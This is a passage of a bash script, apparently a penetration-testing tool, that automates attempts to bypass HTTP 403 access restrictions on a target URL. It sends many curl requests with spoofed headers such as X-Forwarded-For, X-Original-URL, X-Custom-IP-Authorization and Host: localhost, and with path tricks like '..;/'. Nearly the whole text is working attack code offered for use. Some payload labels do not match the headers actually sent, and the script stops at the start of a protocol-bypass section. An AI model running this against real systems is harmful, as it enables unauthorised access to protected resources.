#!/bin/bash

# Partial bash safe mode: http://redsymbol.net/articles/unofficial-bash-strict-mode/
set -o pipefail
IFS=$'\n\t'

# Arg parse
for i in "$@"; do
    case $i in
    --url|-u)
        URL="$2"
        shift;shift;
        ;;
    --outdir|-o)
        OUTDIR="$2"
        shift;shift;
        ;;
    --header|-H)
        HEADER="$2"
        shift;shift;
        ;;
    *)
        ;;
    esac
done

if [[ -z "$URL" ]];
then
    echo "Usage: $0 --url <URL> [--outdir <OUTDIR>]"
    echo 'Like : ./bypass.sh -u http://127.0.0.1/ -o bypass-$VHOST-$(date +%s%N)'
    exit 42
fi

# Colors
red="\e[31m"
green="\e[32m"
blue="\e[34m"
cyan="\e[96m"
bold="\033[1m"
end="\e[0m"

print() {
	status=$(echo $code | awk '{print $2}')
if [[ ${status} =~ 2.. ]];then
	echo -e "${bold}${green} $code ${end}${end} "
else
	echo -e "${bold}${red} $code ${end}${end}"
fi
}

if [[ ! "$URL" =~ ^https?://[^/]+/.*$ ]]; then
	echo "Url might be badly formated (missing trailing slash?): $URL"
	exit 42
fi

SCHEME=$(echo "$URL" | cut -d: -f1)
echo "SCHEME=$SCHEME"
VHOST=$(echo "$URL" | cut -d/ -f3)
echo "VHOST=$VHOST"
# Not using PATH, avoid conflicts
PAT=$(echo "$URL" | cut -d/ -f4-)
echo "PAT=$PAT"


if [ -z "$OUTDIR" ]; then
    OUTDIR="bypass-$VHOST-$(date +%s%N)"
fi

mkdir -pv "$OUTDIR" && cd "$OUTDIR"
user_agent="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] Original request  "${end}
echo -e ${blue}"----------------------"${end}

echo -n "Clean request test Payload:"
FILENAME=original.html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent")
print


echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] HTTP Header Bypass"${end}
echo -e ${blue}"----------------------"${end}

echo -n "X-Originally-Forwarded-For Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Originating-  Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Originating-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "True-Client-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "True-Client-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "From Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "Profile http:// Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Arbitrary http:// Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "X-HTTP-DestinationURL http:// Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Proto http:// Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "Destination Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "Proxy Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "CF-Connecting_IP:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "CF-Connecting-IP:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "Referer Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization..;/ Payload"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent")
print
echo -n "X-Originating-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-For Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Remote-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Client-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Host Payload"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Host Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Original-URL Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$PAT" -X GET "$URL/anything" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$PAT" -X GET "$URL/anything" -H "$user_agent")
print
echo -n "X-Rewrite-URL Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$PAT" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$PAT" -X GET "$URL" -H "$user_agent")
print
echo -n "Content-Length Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent")
print
echo -n "X-ProxyUser-Ip Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Base-Url Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Client-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Http-Url Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Proxy-Host Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Proxy-Url Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Real-Ip Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Redirect Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Referrer Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Request-Uri Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Uri Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Url Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forward-For Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-By Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-For-Original Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Server Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarder-For Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Http-Destinationurl Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Http-Host-Override Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Original-Remote-Addr Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Proxy-Url Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Real-Ip Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Remote-Addr Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Host: <empty> Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent")
print
echo -n "Host: localhost Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent")
print
echo -n "Host: 127.0.0.1 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Host: 0.0.0.0 Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent")
print
echo -n "X-OReferrer Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent")
print



echo -e ${blue}"-------------------------"${end}
echo -e ${cyan}"[+] Protocol Based Bypass"${end}
echo -e ${blue}"-------------------------"${end}
echo -n "HTTP Scheme Payload:"
FILENAME=$(date +%s%N).html
